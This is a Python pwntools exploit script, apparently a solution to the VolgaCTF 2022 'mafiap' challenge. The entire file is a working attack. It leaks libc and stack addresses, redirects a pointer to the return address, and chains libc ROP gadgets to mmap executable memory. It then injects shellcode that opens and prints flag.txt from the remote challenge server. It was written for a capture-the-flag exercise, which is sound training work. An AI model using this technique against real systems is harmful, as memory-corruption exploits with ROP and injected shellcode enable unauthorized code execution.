#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./mafiap',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

if args.REMOTE:
	p = remote('mafia.q.2022.volgactf.ru', 1337)
else:
	p = process(binary.path)

# leak libc
p.sendlineafter(b'>> ',b'1')
p.sendlineafter(b'size:\n',b'48')
p.sendlineafter(b'index:\n',b'0')
p.sendlineafter(b'string:\n',7 * b'A')
p.sendlineafter(b'>> ',b'3')
p.sendlineafter(b'index:\n',b'0')
p.recvline()
libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts - 378
log.info('libc.address: {x}'.format(x = hex(libc.address)))

# stack leak and return address compute
p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b'index:\n',b'0')
p.sendlineafter(b'string:\n',23 * b'A')
p.sendlineafter(b'>> ',b'3')
p.sendlineafter(b'index:\n',b'0')
p.recvline()
stack_leak = u64(p.recv(6) + b'\0\0')
log.info('stack_leak: {x}'.format(x = hex(stack_leak)))
return_address = stack_leak + 8
log.info('return_address: {x}'.format(x = hex(return_address)))

# sometimes things are not as we'd like them, it's possible there's a more stable place to look
if stack_leak >> 40 != 0x7f:
	p.close()
	log.critical('this is not the stack leak you\'re looking for, try again')
	sys.exit(1)

# read syscall will fail if rdx is too big in some cases
if (return_address + 0xfffffffc) > 2**47 - 1:
	p.close()
	log.critical('read beyond user-space: {x}'.format(x = hex(return_address + 0xfffffffc)))
	log.critical('read syscall will fail, try again')
	sys.exit(1)

# change string 0 to point to return address
p.sendlineafter(b'>> ',b'1')
p.sendlineafter(b'size:\n',b'0')
p.sendlineafter(b'index:\n',b'1')
p.sendlineafter(b'string:\n',0xa0 * b'A' + p64(return_address))

'''
mmap route

1. create shellcode just like exploit.py rop chain
2. use a lot of gadgets to set all 6 registers for mmap to create rwx space
3. call mmap
4. get rax from mmap for use with read and a jmp rax gadget
'''

shellcode = asm(f'''
xor rdi, rdi
mov rax, {constants.SYS_close}
syscall

lea rdi, [rip+flag]
xor rsi, rsi
xor rdx, rdx
mov rax, {constants.SYS_open}
syscall

mov rdi, rax
lea rsi, [rip+flag]
mov rdx, 100
mov rax, {constants.SYS_read}
syscall

mov rdx, rax
mov rdi, 1
mov rax, {constants.SYS_write}
syscall
hlt

flag: .asciz "flag.txt"
''')

syscall = libc.search(asm('syscall; ret')).__next__()
pop_rax = libc.search(asm('pop rax; ret')).__next__()
pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
pop_rsi = libc.search(asm('pop rsi; ret')).__next__()
pop_rax_rdx_rbx = libc.search(asm('pop rax; pop rdx; pop rbx; ret')).__next__()
pop_rdx_rbx = libc.search(asm('pop rdx; pop rbx; ret')).__next__()
pop_rbx = libc.search(asm('pop rbx; ret')).__next__()

payload = b''

'''
mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)

call mmap, rax will have location of rwx memory
'''
payload += p64(pop_rsi)
payload += p64(4096)

payload += p64(pop_rdx_rbx)
payload += p64(constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC)
payload += p64(0)

# 0x000000000011ba70: xor r10d, r10d; mov eax, r10d; ret
payload += p64(libc.address + 0x000000000011ba70)
payload += p64(pop_rdi)
payload += p64(return_address + len(payload) + 0x18 - 0x20)
# 0x0000000000039f5e: add r10, qword ptr [rdi + 0x20]; mov rax, r10; ret
payload += p64(libc.address + 0x0000000000039f5e)
payload += p64(pop_rdi) # jump over mmap flags
payload += p64(constants.MAP_PRIVATE | constants.MAP_ANONYMOUS)

# although man man recommends setting the follow with MAP_ANONYMOUS, it does not matter
'''
# 0x000000000012a956: pop r8; mov eax, 1; ret;
payload += p64(libc.address + 0x000000000012a956)
payload += p64(2**64 - 1)

# 0x00000000000d3960: xor r9d, r9d; mov eax, r9d; ret
payload += p64(libc.address + 0x00000000000d3960)
'''

payload += p64(pop_rdi)
payload += p64(0)

payload += p64(pop_rax)
payload += p64(constants.SYS_mmap)
payload += p64(syscall)

'''
read

1. self mod code, move rax to stack just after pop rsi
2. save location of address for jmp rax
3. then read from stdin
'''
payload += p64(pop_rbx)
payload += p64(return_address + len(payload) + 0x10)
# 0x000000000007f906: mov qword ptr [rbx + 0x10], rax; mov rax, rbx; pop rbx; ret;
payload += p64(libc.address + 0x000000000007f906)
payload += p64(0)
payload += p64(pop_rsi)
jmp = return_address + len(payload) # jmp will be rsp
payload += p64(0) # fake will be self modified by above gadget, nice!

# rdi, rdx then read
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rax_rdx_rbx)
payload += p64(constants.SYS_read)
payload += p64(len(shellcode))
payload += p64(0)
payload += p64(syscall)

'''
run it, using jmp above stack cannot be trusted, but works in this case
i could have made a copy down stack, but was lazy
'''
payload += p64(pop_rbx)
payload += p64(jmp - 0x18)
# 0x00000000000826ac: mov rax, qword ptr [rbx + 0x18]; add rsp, 0x10; pop rbx; jmp rax;
payload += p64(libc.address + 0x00000000000826ac)

# write out and exec rop chain
p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b'index:\n',b'0')
p.sendlineafter(b'string:\n',payload)
p.sendlineafter(b'>> ',b'4')

# small pause to allow read syscall to be ready, then send shellcode to waiting read syscall
sleep(0.1)
p.send(shellcode)

flag = p.recvuntil(b'}').decode()
p.close()
print(flag)

